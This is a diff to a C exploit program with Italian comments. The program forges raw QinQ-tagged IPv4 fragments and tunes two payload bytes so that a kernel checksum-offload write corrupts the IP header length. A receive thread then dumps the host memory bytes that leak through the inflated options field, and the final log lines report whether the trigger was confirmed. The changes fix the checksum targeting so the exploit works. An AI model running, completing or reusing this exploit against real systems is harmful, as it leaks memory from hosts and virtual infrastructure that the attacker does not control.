@@ -44,6 +44,7 @@
 #define FILL_BYTE 0x41
 #define LOG_PATH "/root/c2/log.txt"
 #define RX_WINDOW_SEC 30
+#define MAX_TAIL 64
 
 static FILE *g_log;
 static pthread_mutex_t g_log_mu = PTHREAD_MUTEX_INITIALIZER;
@@ -60,7 +61,7 @@ static void lg(const char *fmt, ...) {
         fputc('\n', g_log);
         fflush(g_log);
     }
-    /* mirror to stderr so stdout stays clean for the leak dump */
+    /* mirror su stderr: stdout resta pulito per il dump del leak */
     fprintf(stderr, "[%s] ", ts);
     va_start(ap, fmt); vfprintf(stderr, fmt, ap); va_end(ap);
     fputc('\n', stderr);
@@ -71,7 +72,7 @@ static void lg(const char *fmt, ...) {
 /* ---------- checksum helpers ---------- */
 static uint16_t fold16(uint32_t s) {
     while (s >> 16) s = (s & 0xffff) + (s >> 16);
-    return ~s & 0xffff;
+    return (uint16_t)(~s & 0xffff);
 }
 static uint32_t be_sum(const uint8_t *p, int n) {
     uint32_t s = 0;
@@ -82,11 +83,16 @@ static uint32_t be_sum(const uint8_t *p, int n) {
 static uint16_t iph_checksum(const uint8_t *h, int len) {
     return fold16(be_sum(h, len));
 }
+
+/* Il kernel scrive a csum_start+csum_offset il complemento a 16 bit della
+ * somma del flusso. Vogliamo che il byte BASSO del checksum risultante sia
+ * 0x4f, così il byte ip[0] diventa 0x4f (IHL=60). Il confronto originale
+ * con 0xff00 era invertito. */
 static int tune_payload(uint8_t *p1, uint32_t base_sum) {
     for (int x = 0; x < 256; x++)
         for (int y = 0; y < 256; y++) {
             uint16_t f = fold16(base_sum + ((uint32_t)x << 8) + (uint32_t)y);
-            if ((f & 0xff00) == ((uint16_t)IHL_FLIP_HI << 8)) {
+            if ((f & 0x00ff) == IHL_FLIP_HI) {
                 p1[0] = (uint8_t)x; p1[1] = (uint8_t)y;
                 return 0;
             }
@@ -171,21 +177,34 @@ static void build_tail(uint8_t *f, const uint8_t *dhost, const uint8_t *shost,
     memset(f + QINQ_HDR_LEN + IP4_HDR_LEN, FILL_BYTE, (size_t)plen);
 }
 
+/* somma BE reale del flusso IP a partire da csum_start, su frag1 + tutti i tail.
+ * Il kernel sostituisce i 2 byte a csum_start+csum_offset con ~somma, quindi
+ * per il tuning ci serve la somma di TUTTO il flusso (esclusi quei 2 byte, che
+ * sono proprio p1[0..1] e vengono aggiunti in tune_payload). */
+static uint32_t compute_base(const uint8_t *frag1, size_t frag1_len,
+                             uint8_t tails[][QINQ_HDR_LEN + IP4_HDR_LEN + 9200],
+                             int n_tail, int tail_len, uint16_t csum_start) {
+    uint32_t s = 0;
+    s += be_sum(frag1 + csum_start, (int)(frag1_len - csum_start));
+    for (int i = 0; i < n_tail; i++)
+        s += be_sum(tails[i] + csum_start, tail_len - csum_start);
+    return s;
+}
+
 /* ---------- thread RX ---------- */
 static volatile int g_run = 1;
 static uint16_t g_want_id;
 static int g_seen_frag, g_seen_mutated;
 
-/* dump 32 leaked bytes to stdout as hex + ASCII */
+/* dump dei byte trapelati su stdout (hex + ASCII) e nel log */
 static void dump_leak(const uint8_t *p, int n, const char *why) {
     char hex[3 * 64 + 1], asc[64 + 1];
     int hn = 0, an = 0, m = n > 60 ? 60 : n;
     for (int i = 0; i < m; i++) {
-        hn += snprintf(hex + hn, sizeof(hex) - hn, "%02x ", p[i]);
+        hn += snprintf(hex + hn, sizeof(hex) - (size_t)hn, "%02x ", p[i]);
         asc[an++] = (p[i] >= 0x20 && p[i] < 0x7f) ? (char)p[i] : '.';
     }
     hex[hn] = '\0'; asc[an] = '\0';
-    /* stdout: the actual leaked bytes */
     printf("LEAK[%s] len=%d hex: %s\n", why, n, hex);
     printf("LEAK[%s] ascii: %s\n", why, asc);
     fflush(stdout);
@@ -223,7 +242,6 @@ static void *rx_thread(void *arg) {
             g_seen_mutated = 1;
             int opts_len = (int)ihl - 20;
             if (opts_len < 0) opts_len = 0;
-            /* clamp to what we actually received */
             if ((size_t)(20 + opts_len) > hdr_rem) opts_len = (int)hdr_rem - 20;
             if (opts_len < 0) opts_len = 0;
             int leaked = 0;
@@ -250,7 +268,7 @@ int main(int argc, char **argv) {
 
     mkdir("/root/c2", 0755);
     g_log = fopen(LOG_PATH, "a");
-    if (!g_log) { perror("fopen log"); }   /* lg() handles NULL */
+    if (!g_log) { perror("fopen log"); }   /* lg() gestisce NULL */
     g_want_id = id;
 
     uint8_t dhost[6] = { 0x02, 0xfc, 0x00, 0x00, 0x00, 0x05 };
@@ -262,21 +280,31 @@ int main(int argc, char **argv) {
     int plen = (max_frame - (QINQ_HDR_LEN + IP4_HDR_LEN)) & ~7;
     if (plen < 400) { lg("MTU %d troppo piccolo", mtu); return 1; }
     int n_tail = (mtu - 28) / plen + 1;
+    if (n_tail > MAX_TAIL) { lg("n_tail %d > MAX_TAIL", n_tail); return 1; }
     lg("=== start iface=%s mtu=%d plen=%d n_tail=%d id=0x%04x csum_start=%u csum_off=%u",
        ifname, mtu, plen, n_tail, id, csum_start, csum_off);
 
     static uint8_t f1[QINQ_HDR_LEN + IP4_HDR_LEN + 8];
-    static uint8_t tailbuf[QINQ_HDR_LEN + IP4_HDR_LEN + 9200];
-    if (QINQ_HDR_LEN + IP4_HDR_LEN + plen > (int)sizeof(tailbuf)) { lg("plen overflow"); return 1; }
+    static uint8_t tail_store[MAX_TAIL][QINQ_HDR_LEN + IP4_HDR_LEN + 9200];
+    const int tail_len = QINQ_HDR_LEN + IP4_HDR_LEN + plen;
+    if (tail_len > (int)sizeof(tail_store[0])) { lg("plen overflow"); return 1; }
 
+    /* 1) costruisci frag1 provvisorio e tutti i tail per il calcolo della somma */
     build_frag1(f1, dhost, shost, saddr, daddr, id, p1);
-    uint32_t base = be_sum(f1 + QINQ_HDR_LEN, IP4_HDR_LEN)
-                  + be_sum(p1 + 2, 6)
-                  + (uint32_t)n_tail * ((uint32_t)plen / 2) * 0x4141u;
+    for (int i = 0; i < n_tail; i++) {
+        uint16_t off = (uint16_t)(1 + i * (plen / 8));
+        build_tail(tail_store[i], dhost, shost, saddr, daddr, id, off,
+                   i == n_tail - 1, plen);
+    }
+
+    /* 2) calcola la somma REALE del flusso IP (frag1 + tutti i tail) da csum_start */
+    uint32_t base = compute_base(f1, sizeof(f1), tail_store, n_tail, tail_len, csum_start);
+
+    /* 3) tune di p1[0..1] per ottenere il byte basso 0x4f */
     if (tune_payload(p1, base) < 0) { lg("tuning fallito"); return 1; }
     build_frag1(f1, dhost, shost, saddr, daddr, id, p1);
 
-    /* RX thread parte PRIMA del TX */
+    /* 4) RX thread parte PRIMA del TX */
     pthread_t rx;
     if (pthread_create(&rx, NULL, rx_thread, (void *)ifname) != 0) { lg("pthread_create"); return 1; }
     usleep(200000);   /* dai tempo al RX socket di bindare */
@@ -284,12 +312,10 @@ int main(int argc, char **argv) {
     int fd = open_pkt_sock(ifname, 1);
     if (fd < 0) { g_run = 0; pthread_join(rx, NULL); return 1; }
 
-    uint16_t off = 1;
+    /* 5) invia i tail NELLO STESSO ORDINE usato per il calcolo */
     for (int i = 0; i < n_tail; i++) {
-        build_tail(tailbuf, dhost, shost, saddr, daddr, id, off, i == n_tail - 1, plen);
-        if (send_vnet(fd, tailbuf, QINQ_HDR_LEN + IP4_HDR_LEN + plen, 0, 0, 0) < 0)
+        if (send_vnet(fd, tail_store[i], (size_t)tail_len, 0, 0, 0) < 0)
             lg("send tail %d: %s", i, strerror(errno));
-        off = (uint16_t)(off + plen / 8);
         usleep(1000);
     }
     usleep(2000);
@@ -304,7 +330,7 @@ int main(int argc, char **argv) {
     if (g_seen_mutated)
         lg("[+] VERDETTO: TRIGGER CONFERMATO (0x4f osservato in ingresso)");
     else if (g_seen_frag)
-        lg("[-] VERDETTO: frammenti tornati ma drift non avvenuto (tx offload? decap VLAN? csum_start?)");
+        lg("[-] VERDETTO: frammenti tornati ma drift non avvenuto (tx offload? decap VLAN? csum_start? patch host?)");
     else
         lg("[-] VERDETTO: nessun frammento id=0x%04x tornato (bounce/NAT assente o defrag host assente)", id);
     if (g_log) fclose(g_log);
